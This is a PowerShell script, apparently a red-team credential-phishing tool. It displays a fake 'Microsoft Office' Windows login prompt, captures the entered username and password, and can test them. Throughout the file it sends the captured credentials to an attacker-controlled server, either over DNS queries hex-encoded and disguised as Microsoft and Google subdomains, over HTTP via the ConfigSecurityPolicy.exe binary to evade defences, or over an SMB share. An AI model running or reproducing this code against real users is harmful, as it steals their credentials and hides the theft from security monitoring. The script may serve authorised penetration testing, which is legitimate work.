# exfil address
$exfilServer = "192.168.56.112"

# prompt
$targetUser = $env:username
$companyEmail = "blackhillsinfosec.com"
$promptCaption = "Microsoft Office"
$promptMessage = "Connecting to: $targetUser@$companyEmail"
$maxTries = 1 # maximum number of times to invoke prompt
$delayPrompts = 2 # seconds between prompts
$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid

# dns
# start dns server in kali: python3 /path/to/credphish/dns_server.py
$enableDnsExfil = $true
$exfilDomains = @('.microsoft.com', '.google.com', '.office.com', '.live.com') # domains for dns exfil
$randomDelay = get-random -minimum 1 -maximum 10 # delay between dns queries
$subdomainLength = 6 # maximum chars in subdomain. must be an even number between 2-60 or queries may break

# http
# start http server in kali: python3 -m http.server 80
$enableHttpExfil = $false
$httpPort = 80
$ConfigSecurityPolicy = "C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe"

# smb
# start smb server in kali: impacket-smbserver -smb2support exfilShare ${PWD}
$enableSmbExfil = $false
$shareName = "exfilShare" # must match share in impacket-smbserver (i.e., exfilShare)
$outputFile = "credentials.txt" # filename of exfiltrated credentials

##########################################################################

$exfilCount = 0
function invokeDnsExfil(){
    $subdomain = ""
    function invokeDnsResolve(){
        $hex = @()
        for($j=0;$j -lt $subdomain.length;$j++){
            $b = "{0:X}" -f ([int]$subdomain[$j])
            $hex = $hex + $b
            }
        $randomDomain = get-random -maximum ($exfilDomains.count)
        $exfil = ($hex -join '') + $exfilDomains[($randomDomain)]
        resolve-dnsname $exfil.ToLower() -Type A -Server $exfilServer | out-null
        start-sleep -Seconds $randomDelay
    }
    foreach ($c in 0..$capturedCreds.Length){
        $subdomain += $capturedCreds[$c]
        if (($subdomain.Length * 2) -ge $subdomainLength){
            invokeDnsResolve
            $subdomain = ""
            $exfilCount = 0
        }else{
            $exfilCount++
        }
    }
    if ($subdomain) {
        invokeDnsResolve
    }
}

function invokeHttpExfil(){
    $httpServer = 'http://' + $exfilServer + ':' + $httpPort + '/' + [uri]::EscapeDataString($capturedCreds)
    if (test-path -path $ConfigSecurityPolicy) {
        & $ConfigSecurityPolicy $httpServer
    }else{
        # HTTP method w/ Invoke-WebRequest (lame)
        Invoke-WebRequest -UseBasicParsing $httpServer | Out-Null
    }
}

function invokeSmbExfil(){
    $capturedCreds | Out-File -Encoding utf8 \\$exfilServer\$shareName\$outputFile
}

function testCredentials(){
    $securePassword = ConvertTo-SecureString -AsPlainText $phish.CredentialPassword -Force
    $secureCredentials = New-Object System.Management.Automation.PSCredential($phish.CredentialUsername, $securePassword)
    Start-Process ipconfig -Credential $secureCredentials
    return $?
}

Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | `
? { $_.Name -eq 'AsTask' -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[void][Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
$asTask = $asTask.MakeGenericMethod(([Windows.Security.Credentials.UI.CredentialPickerResults]))
$opt = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$opt.AuthenticationProtocol = 0
$opt.Caption = $promptCaption
$opt.Message = $promptMessage
$opt.TargetName = '1'

$count = 0
$ErrorActionPreference = 'SilentlyContinue'
[system.collections.arraylist]$harvestCredentials = @()
while (!($validPassword -Or $count -eq $maxTries)){
    start-sleep -s $delayPrompts
    $phish = $asTask.Invoke($null, @(([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($opt)))).Result
    [void]$harvestCredentials.Add($phish.CredentialUsername + ':' + $phish.CredentialPassword)
    if (!($phish.CredentialPassword) -Or !($phish.CredentialUsername)){
        Continue
    }
    if ($validateCredentials){
        $validPassword = testCredentials
    }
    $count++
}

$capturedCreds = $env:computername + '[' + ($harvestCredentials -join ',') + ']'
if ($enableDnsExfil){
    invokeDnsExfil
}

if ($enableHttpExfil){
    invokeHttpExfil
}

if ($enableSmbExfil){
    invokeSmbExfil
}